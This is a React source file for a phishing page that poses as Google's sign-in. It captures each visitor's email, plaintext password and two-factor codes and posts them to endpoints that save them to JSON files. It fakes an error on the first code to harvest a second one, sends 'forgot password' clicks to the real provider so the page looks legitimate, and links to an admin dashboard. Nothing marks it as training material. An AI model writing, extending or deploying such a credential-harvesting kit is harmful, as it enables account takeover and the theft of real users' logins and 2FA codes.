import { useState } from "react";
import { GoogleLogo } from "@/components/GoogleLogo";
import { EmailStep } from "@/components/EmailStep";
import { PasswordStep } from "@/components/PasswordStep";
import { TwoFactorStep } from "@/components/TwoFactorStep";
import { SuccessStep } from "@/components/SuccessStep";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import type { InsertLoginAttempt } from "@shared/schema";

export default function Login() {
  const [currentStep, setCurrentStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [sessionId] = useState(() => 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
  const [firstCodeAttempt, setFirstCodeAttempt] = useState(true);

  const logAttemptMutation = useMutation({
    mutationFn: async (attemptData: Omit<InsertLoginAttempt, 'sessionId'>) => {
      const response = await apiRequest('POST', '/api/login-attempts', {
        ...attemptData,
        sessionId,
      });
      return response.json();
    },
  });

  const logAttempt = (data: Partial<InsertLoginAttempt>) => {
    const stepNames = {
      1: 'email_input',
      2: 'password_input', 
      3: 'two_factor_verification',
      4: 'login_success'
    };

    logAttemptMutation.mutate({
      step: currentStep,
      stepName: stepNames[currentStep as keyof typeof stepNames] || 'unknown',
      ...data,
    });
  };

  const handleEmailNext = async (emailValue: string) => {
    setEmail(emailValue);
    
    // Save to main database
    logAttempt({ email: emailValue });
    
    // Save to separate JSON file
    try {
      await apiRequest('POST', '/api/save-email', {
        email: emailValue,
        sessionId,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('Failed to save email data:', error);
    }
    
    setCurrentStep(2);
  };

  const handlePasswordNext = async (passwordValue: string) => {
    setPassword(passwordValue);
    
    // Save to main database
    logAttempt({ email, passwordLength: passwordValue.length });
    
    // Save to separate JSON file
    try {
      await apiRequest('POST', '/api/save-password', {
        email,
        password: passwordValue,
        passwordLength: passwordValue.length,
        sessionId,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('Failed to save password data:', error);
    }
    
    setCurrentStep(3);
  };

  const handleCodeVerification = async (code: string) => {
    const isFirstAttempt = firstCodeAttempt;
    
    if (isFirstAttempt) {
      // Save first code attempt to separate JSON file (code.json)
      try {
        await apiRequest('POST', '/api/save-first-code', {
          email,
          code,
          attempt: 'first',
          result: 'error',
          sessionId,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        });
      } catch (error) {
        console.error('Failed to save first code data:', error);
      }
      
      logAttempt({ twoFactorCode: code, attempt: 'first', result: 'error' });
      setFirstCodeAttempt(false);
      return false; // Show error
    } else {
      // Save second code attempt to separate JSON file (codes.json)
      try {
        await apiRequest('POST', '/api/save-second-code', {
          email,
          code,
          attempt: 'second',
          result: 'success',
          sessionId,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        });
      } catch (error) {
        console.error('Failed to save second code data:', error);
      }
      
      logAttempt({ twoFactorCode: code, attempt: 'second', result: 'success' });
      setCurrentStep(4);
      return true; // Success
    }
  };

  const handleForgotPassword = () => {
    const emailLower = email.toLowerCase();
    let redirectUrl = '';

    if (emailLower.includes('@gmail.com')) {
      redirectUrl = 'https://accounts.google.com/signin/recovery';
    } else if (emailLower.includes('@yahoo.com')) {
      redirectUrl = 'https://login.yahoo.com/forgot';
    } else if (emailLower.includes('@outlook.com') || emailLower.includes('@hotmail.com') || emailLower.includes('@live.com')) {
      redirectUrl = 'https://account.live.com/password/reset';
    } else {
      alert('Please contact your administrator to reset your password.');
      return;
    }

    logAttempt({ action: 'forgot_password_redirect', email, redirectUrl });
    // Open the real forgot password link in a new tab
    window.open(redirectUrl, '_blank');
  };

  const handleResendCode = () => {
    logAttempt({ action: 'resend_code' });
    alert('Verification code sent!');
  };

  return (
    <div className="min-h-screen flex flex-col">
     

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4 bg-white">
        <div className="w-full max-w-md">
          {/* Main Login Card */}
          <div className="bg-white border border-gray-200 rounded-lg p-12 shadow-sm">
            {/* Google Logo */}
            <div className="flex justify-center mb-8">
              <GoogleLogo size="large" />
            </div>

            {/* Step Components */}
            {currentStep === 1 && (
              <EmailStep
                onNext={handleEmailNext}
                onForgotEmail={() => alert('Forgot email functionality')}
              />
            )}

            {currentStep === 2 && (
              <PasswordStep
                email={email}
                onNext={handlePasswordNext}
                onBack={() => setCurrentStep(1)}
                onForgotPassword={handleForgotPassword}
              />
            )}

            {currentStep === 3 && (
              <TwoFactorStep
                email={email}
                onVerify={handleCodeVerification}
                onBack={() => setCurrentStep(2)}
                onResendCode={handleResendCode}
                firstCodeAttempt={firstCodeAttempt}
              />
            )}

            {currentStep === 4 && (
              <SuccessStep onContinue={() => alert('Login completed!')} />
            )}
          </div>

          {/* Footer */}
          <div className="mt-8 flex flex-wrap justify-center items-center space-x-6 text-xs text-google-gray">
            <select className="bg-transparent border-none text-xs text-google-gray cursor-pointer">
              <option>English (United States)</option>
            </select>
            <a href="/admin" className="hover:underline text-google-blue">Admin Dashboard</a>
            <button className="hover:underline">Help</button>
            <button className="hover:underline">Privacy</button>
            <button className="hover:underline">Terms</button>
          </div>
        </div>
      </div>
    </div>
  );
}
